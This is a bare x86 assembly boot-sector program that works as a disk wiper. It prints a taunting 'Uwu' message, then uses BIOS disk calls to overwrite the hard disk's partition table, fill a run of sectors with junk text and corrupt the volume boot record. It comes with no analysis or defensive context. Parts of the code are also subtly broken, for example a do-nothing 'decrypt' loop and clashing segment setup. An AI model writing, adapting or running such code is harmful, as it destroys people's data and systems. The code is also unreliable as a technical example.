[org 0x7C00]


ikuyooo:

    mov ax, 0x07C0
    mov ds, ax
    mov es, ax
    mov fs, ax
    mov gs, ax
    mov ss, ax
    mov sp, 0x7C00 


    mov si, sayonara_tehehe
    call print_string


    call uwu_payload


    jmp $


print_string:
    mov ah, 0x0E
.print_loop:
    mov al, [si]
    cmp al, 0x00
    je .print_done
    int 0x10
    inc si
    jmp .print_loop
.print_done:
    ret


uwu_payload:

    mov si, uwu_key
    mov cx, 5
.decrypt_loop:
    lodsb
    loop .decrypt_loop


    call read_disk_mbr_to_buffer

    mov di, 0x7C00 + 0x1BE
    mov cx, 4 * 16 ; 
    mov al, 'U'
.overwrite_pt_loop:
    stosb
    loop .overwrite_pt_loop


    call write_buffer_to_disk_mbr

    mov cx, 255
.sector_wipe_loop:
    push cx 


    call fill_buffer_with_uwu


    mov ax, 0x0000
    mov es, ax
    mov bx, 0x7C00
    mov ah, 0x03 
    mov al, 0x01 
    mov ch, 0x00 

    mov dh, 0x00
    mov dl, 0x80 
    int 0x13

    pop cx  
    inc cl 
    loop .sector_wipe_loop


    call read_disk_vbr_to_buffer
    call corrupt_vbr
    call write_buffer_to_disk_vbr

    ret


sayonara_tehehe: db 'Uwu Uwu bye bye! Tehehe...', 0x0D, 0x0A, 0x00
uwu_uwu:        db 'UwU I got ya!', 0x00
Ayaya_OwO:      db 'UwU', 0x00
uwu_key:        db 'UwUo', 'OwOo', 'UwUo', 'OwOo', 'UwUo'


read_disk_mbr_to_buffer:
    mov ax, 0x0000
    mov es, ax
    mov bx, 0x7C00
    mov ah, 0x02 
    mov al, 0x01 
    mov ch, 0x00 
    mov cl, 0x01 
    mov dh, 0x00 
    mov dl, 0x80 
    int 0x13
    ret


write_buffer_to_disk_mbr:
    mov ax, 0x0000
    mov es, ax
    mov bx, 0x7C00
    mov ah, 0x03 
    mov al, 0x01 
    mov ch, 0x00 
    mov cl, 0x01 
    mov dh, 0x00 
    mov dl, 0x80 
    int 0x13
    ret


read_disk_vbr_to_buffer:
    mov ax, 0x0000
    mov es, ax
    mov bx, 0x7C00
    mov ah, 0x02 
    mov al, 0x01 
    mov ch, 0x00 
    mov cl, 0x02 
    mov dh, 0x00 
    mov dl, 0x80 
    int 0x13
    ret

write_buffer_to_disk_vbr:
    mov ax, 0x0000
    mov es, ax
    mov bx, 0x7C00
    mov ah, 0x03 
    mov al, 0x01 
    mov ch, 0x00 
    mov cl, 0x02 
    mov dh, 0x00 
    mov dl, 0x80 
    int 0x13
    ret


fill_buffer_with_uwu:
    pusha
    mov di, 0x7C00
    mov cx, 512 / 9 
    mov si, uwu_uwu
.fill_loop:
    push cx
    mov cx, 9
.copy_string:
    mov al, [si]
    stosb
    inc si
    loop .copy_string
    mov si, uwu_uwu
    pop cx
    loop .fill_loop

    mov cx, 512 % 9
    mov al, 'U'
.fill_remainder:
    stosb
    loop .fill_remainder
    popa
    ret


corrupt_vbr:
    pusha

    mov di, 0x7C00 + 0x03 
    mov al, 'w'
    stosb
    stosb
    stosb
    stosb
    stosb
    popa
    ret

times 510-($-$$) db 0
dw 0xAA55